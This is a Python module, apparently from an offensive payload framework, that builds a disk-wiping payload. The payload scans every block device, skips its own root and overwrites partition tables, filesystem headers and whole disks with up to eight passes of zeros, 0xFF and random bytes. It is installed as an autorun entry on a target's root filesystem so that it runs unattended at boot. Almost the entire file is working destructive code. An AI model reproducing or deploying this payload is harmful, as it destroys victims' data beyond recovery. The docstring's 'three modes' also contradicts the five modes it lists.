"""
Payload that scans for all disks, wiping them all. It has three modes:

Mode A: Overwrite partition table and filesystem headers.
        Software recovery: Easily possible
        Hardware recovery: Easily possible
Mode B: Overwrite the partition table and filesystem headers then write 0 to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment
Mode C: Overwrite the partition table and filesystem headers then write 0, and then 0xFF to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment, considerable recovery rate
Mode D: Overwrite the partition table and filesystem headers then write 0, and then 0xFF, and then a random value to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment, low recovery rate
Mode E: Overwrite the partition table and filesystem headers then write 0, and then 0xFF, and then 5 passes of random values to every single byte.
        Software recovery: Not possible
        Hardware recovery: Almost impossible to get much with the right equipment, however still very little parts may be recoverable
"""

from libsnr.util.payloads.autorun import Autorun
from snr.variables import global_vars
from libsnr.util.common_utils import print_error, rootfs_open

LICENSE = "Apache-2.0"
AUTHORS = ["GlobularOne"]
INPUTS = (
    "WIPE_MODE",
)

PAYLOAD = r"""#!/usr/bin/python3

import random
from libsnr.payload.safety_pin import require_lack_of_safety_pin
from libsnr.util.common_utils import print_info, print_ok, print_error
from libsnr.payload.storage import lvm_scan_all, lvm_activate_all_vgs, query_all_block_info, get_partition_root
from libsnr.payload.context import create_context_for_mountpoint


WIPE_MODE = "@WIPE_MODE@"

def pass_zero(path: str, kbs: int):
    with open(path, "wb") as stream:
        for i in range(kbs):
            stream.write(b'\0' * 1024)
            stream.flush()


def pass_ff(path: str, kbs: int):
    with open(path, "wb") as stream:
        for i in range(kbs):
            stream.write(b'\xFF' * 1024)
            stream.flush()


def pass_random(path: str, kbs: int):
    with open(path, "wb") as stream:
        for i in range(kbs):
            stream.write(random.randbytes(1024))
            stream.flush()


def main():
    require_lack_of_safety_pin()
    lvm_scan_all()
    lvm_activate_all_vgs()
    block_info = query_all_block_info()
    wipe_level = ord(WIPE_MODE) - ord("A")
    print_ok("Wipe_disks payload started")
    # We need a context for our root, to not wipe ourselves
    context = create_context_for_mountpoint("/")
    if context is None:
        print_error("Creating context for / failed")
        # We cannot continue
        return
    our_device = get_partition_root(context["device"], block_info)
    if our_device is None:
        print_error("Finding partition root device for / failed")
        return
    for block in block_info:
        if block["path"] != our_device and block['type'] != "rom":
            print_info(f"Targeting {block['path']}")
            # Level 0: All levels have this
            # No matter the mode, we must override the partition table header and filesystem header
            if "children" in block:
                for child in block["children"]:
                    print_info(f"Wiping filesystem info on {child['path']}")
                    pass_zero(child["path"], 1024)
            print_info(f"Wiping partition table on {block['path']}")
            pass_zero(block["path"], 1024)
            if wipe_level >= 1:
                print_info(f"Doing a zero pass on {block['path']}")
                pass_zero(block["path"], block["size"] // 1024)
            if wipe_level >= 2:
                print_info(f"Doing a 0xFF pass on {block['path']}")
                pass_ff(block["path"], block["size"] // 1024)
            if wipe_level >= 3:
                print_info(f"Doing a random pass on {block['path']}")
                pass_random(block["path"], block["size"] // 1024)
            if wipe_level >= 4:
                for _ in range(5-1):
                    print_info(f"Doing a random pass on {block['path']}")
                    pass_random(block["path"], block["size"] // 1024)
    print_ok("Wipe_disks payload completed")


if __name__ == "__main__":
    main()
"""

def load():
    global_vars.set_variable(
        "WIPE_MODE", "A", 1, "Wipe mode, must be one of A, B, C, D and E")


def unload():
    global_vars.del_variable("WIPE_MODE")


def generate(context: dict):
    wipe_mode = global_vars.get_variable("WIPE_MODE")
    assert isinstance(wipe_mode, str)
    wipe_mode.upper()
    if wipe_mode not in ("A", "B", "C", "D", "E"):
        print_error(f"Invalid wipe mode '{wipe_mode}'")
        return 1
    payload = PAYLOAD
    with rootfs_open(context, "root/wipe.py", "w") as stream:
        payload = payload.replace(f"@WIPE_MODE@", wipe_mode)
        stream.write(payload)
    autorun = Autorun(context)
    autorun.add_executable("python3 /root/wipe.py", "snr_payload")
    autorun.write()
    return 0
